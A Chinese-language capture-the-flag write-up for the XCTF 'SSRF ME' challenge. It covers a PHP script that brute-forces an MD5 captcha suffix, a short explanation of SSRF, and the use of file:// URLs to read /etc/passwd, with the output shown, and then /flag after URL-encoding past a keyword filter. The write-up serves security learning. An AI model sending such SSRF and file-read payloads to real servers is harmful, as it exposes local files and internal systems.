# SSRF ME WF

来源：攻防世界

打开之后是这样的页面：

![image-20251219160002176](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251219160002176.png)

用burp抓包一下这个页面：

```
<a href="./index.php?reset">
```

试一下这个路径：

```
访问：GET /index.php?reset HTTP/1.1
得到200：
<script>location.href='./index.php'</script>
```



再用burp抓包一下submit的请求：

按照提示的URL和captcha:

```
url=http%3A%2F%2F127.0.0.1%3A80%2F&captcha=cbc22e
```

会返回： `wrong capcha`



根据captcha的提示：

```
Captcha: substr(md5(captcha), -6, 6) == "ec0785"
```

这应该就是验证码的验证逻辑，需要找到一个字符串，使得其MD5哈希值的最后6位等于“xxxxx”

##### 逆向哈希，暴力破解：

这种就是典型的逆向哈希问题，通常需要通过暴力破解来解决。

```
<?php
$captcha=0;
while(true)
{
if(substr(md5($captcha), -6, 6) == "0d5913")   //0d5913会变
{
echo $captcha;
break;
}
$captcha++;
 
}
?>
```

通过该脚本就可以得到真正的密码。



然后抓包submit的response请求，其中有个hint：

```
本地靶机不能访问外网
```

所以就可以看出来这是一道SSRF的题目，也就是说在内网的话就可以访问。

> 简单介绍一下SSRF：
>
> 　　SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种安全漏洞，攻击者可以利用该漏洞构造请求，使服务器端向攻击者指定的任意域或IP地址发起请求。这种攻击的目标通常是外网无法直接访问的内部系统。
>
> #### SSRF 的主要攻击方式：
>
> - 内网扫描：攻击者可以利用SSRF漏洞对内网进行端口扫描，获取服务的banner信息。
> - 攻击内网应用：攻击者可以利用SSRF漏洞攻击内网中的应用程序，如SQL注入、XSS攻击等。
> - 读取本地文件：通过`file://`协议读取服务器本地文件。
> - 绕过CDN：攻击者可以利用SSRF漏洞绕过CDN，直接访问源服务器。

我们可以尝试能否读取本地文件：

```
file:///etc/passwd
```

它会返回：

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

也就是说明，我们可以访问，但是没有flag的确切的路径：

尝试 `/flag`

```
file:///flag
```

会返回：

```
hacker
```

说明过滤了关键字：

尝试进行编码：

```
file:///file:///%66%6c%61%67
```

得到flag